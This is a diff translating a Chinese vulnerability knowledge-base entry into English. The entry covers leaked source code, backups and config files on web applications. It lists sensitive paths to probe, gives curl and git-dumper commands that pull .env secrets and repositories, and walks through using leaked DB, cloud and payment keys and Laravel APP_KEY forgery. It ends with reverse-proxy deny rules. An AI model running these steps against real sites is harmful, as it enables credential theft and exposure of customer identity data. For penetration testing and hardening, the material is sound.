@@ -1,68 +1,68 @@
 ---
-title: 源码 / 备份 / 配置泄露
-cve: 无（部署缺陷）
+title: Source-code / backup / configuration disclosure
+cve: None (deployment flaw)
 severity: high
 cvss: 7.5
-product: 通用 Web（PHP/Java/Node 自研站）
-versions: 任意
+product: General web applications (custom PHP/Java/Node sites)
+versions: Any
 ports: 80, 443, 8080
-keywords: .git, .svn, env, backup, zip, sourcemap, swagger, 源码泄露
+keywords: .git, .svn, env, backup, zip, sourcemap, swagger, source-code disclosure
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
 ---
 
-## 指纹
+## Fingerprints
 
-按优先级扫这几类路径（这类站点命中率最高）：
+Scan these path categories in priority order (highest hit rates on this type of site):
 
 ```
-备份:   /www.zip /web.zip /wwwroot.zip /backup.zip /bak.zip /1.zip /<域名>.zip
-        /<域名>.tar.gz /db.sql /dump.sql /sql.zip /temp/ /backup/ /bak/
-版本库: /.git/HEAD  /.git/config  /.svn/wc.db  /.hg/
-配置:   /.env  /.env.bak  /config.php.bak  /config/config.php~  /.index.php.swp
+Backups: /www.zip /web.zip /wwwroot.zip /backup.zip /bak.zip /1.zip /<domain>.zip
+        /<domain>.tar.gz /db.sql /dump.sql /sql.zip /temp/ /backup/ /bak/
+Repositories: /.git/HEAD  /.git/config  /.svn/wc.db  /.hg/
+Config: /.env  /.env.bak  /config.php.bak  /config/config.php~  /.index.php.swp
         /application/database.php  /config/database.php  /web.config
-文档:   /swagger-ui.html  /v2/api-docs  /doc.html  /composer.json  /package.json
-前端:   /static/js/app.js.map  /assets/index-*.js.map  /config.js  /env.js
+Docs:   /swagger-ui.html  /v2/api-docs  /doc.html  /composer.json  /package.json
+Frontend: /static/js/app.js.map  /assets/index-*.js.map  /config.js  /env.js
 ```
 
-判定不能只看 200：`Content-Length`、`Content-Type`、首字节（`PK\x03\x04`=zip、`SQL dump`、`{`=JSON）一起看；`/.git/HEAD` 返回 `ref: refs/heads/master` 才算真命中。
+Do not rely on 200 alone: inspect `Content-Length`, `Content-Type`, and initial bytes (`PK\x03\x04`=zip, `SQL dump`, `{`=JSON) together; `/.git/HEAD` must return `ref: refs/heads/master` to count as a genuine hit.
 
-## 前置条件
+## Prerequisites
 
-- 反代/CDN 没有统一拦截敏感后缀（很多只拦 `/admin`）。
-- **要直连源站**：CDN 通常会把 `.git` 也缓存成 404，源站才是真相（源站定位见 `kb-triage/fingerprint-workflow.md` 与 CDN 段）。
+- The reverse proxy/CDN does not consistently block sensitive suffixes (many block only `/admin`).
+- **Connect directly to the origin**: CDNs often cache `.git` as 404 too; the origin reveals the actual state (for origin discovery, see `kb-triage/fingerprint-workflow.md` and the CDN section).
 
 ## PoC
 
 ```bash
-# 版本库
-git-dumper http://target/.git/ ./src          # 或 GitHack
+# Repositories
+git-dumper http://target/.git/ ./src          # Or GitHack
 sqlite3 .svn/wc.db "select local_relpath from NODES limit 50"
 
-# 配置
+# Configuration
 curl -s http://target/.env | grep -Ei 'DB_|REDIS|OSS|SMS|PAY|SECRET|APP_KEY'
 
-# 备份（确认是 zip 再下）
+# Backups (confirm zip format before downloading)
 curl -sI http://target/www.zip | grep -Ei 'content-type|content-length'
 
-# 前端 sourcemap 还原
+# Reconstruct frontend source from sourcemaps
 npx source-map-explorer app.js.map
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 批量扫路径 → 命中后立刻取"能直接用的密钥"：DB 账号、Redis 口令、OSS AK/SK、短信服务 key、支付商户号与私钥、JWT secret。
-2. `.git` dump 后审计路由与鉴权中间件，重点找"只在前端判断权限"的接口（配合 `api-idor-bola.md`）。
-3. Laravel 的 `.env` 里 `APP_KEY` 泄露 → 可解密/伪造框架加密串与 Cookie。
-4. 拿到 DB → 会员表/订单表/代理表/提现审核表；拿到 OSS AK → 遍历 bucket 里的 KYC 证件与对账单。
-5. 这些是静态文件，没有落地物；但下载会在 access log 留痕（`GET /.git/HEAD` 这种），取证时把自己请求的时间标出来。
+1. Scan paths in bulk → upon a hit, immediately retrieve "directly usable secrets": DB credentials, Redis passwords, OSS AK/SK, SMS service keys, payment merchant IDs and private keys, JWT secrets.
+2. After dumping `.git`, audit routes and authentication middleware, focusing on endpoints that "check permissions only in the frontend" (alongside `api-idor-bola.md`).
+3. Leaked `APP_KEY` in Laravel's `.env` → decrypt/forge framework-encrypted strings and cookies.
+4. DB access → member/order/agent/withdrawal-review tables; OSS AK access → enumerate KYC identity documents and statements in buckets.
+5. These are static files and leave no deployed artifacts, but downloads leave access-log traces (such as `GET /.git/HEAD`); mark your request times when collecting evidence.
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- 反代统一 deny：`\.(git|svn|hg)(/|$)`、`\.(zip|tar\.gz|sql|bak|swp|old|save)$`、`\.env`、`\.map$`。
-- 备份文件放 webroot 之外；CI/CD 不把 `.env`、`.git`、sourcemap 部署到生产。
-- 定期做"部署残留"扫描（上面的路径表本身就是一份检查清单）。
+- Apply consistent reverse-proxy deny rules: `\.(git|svn|hg)(/|$)`, `\.(zip|tar\.gz|sql|bak|swp|old|save)$`, `\.env`, `\.map$`.
+- Store backups outside webroot; exclude `.env`, `.git`, and sourcemaps from production CI/CD deployments.
+- Regularly scan for "deployment leftovers" (the path table above is itself a checklist).
 
-## 参考
+## References
 
-- OWASP WSTG-INFO-05（枚举 Web 服务器内容）；GitHack / git-dumper 项目文档。
+- OWASP WSTG-INFO-05 (enumerating web-server content); GitHack / git-dumper project documentation.
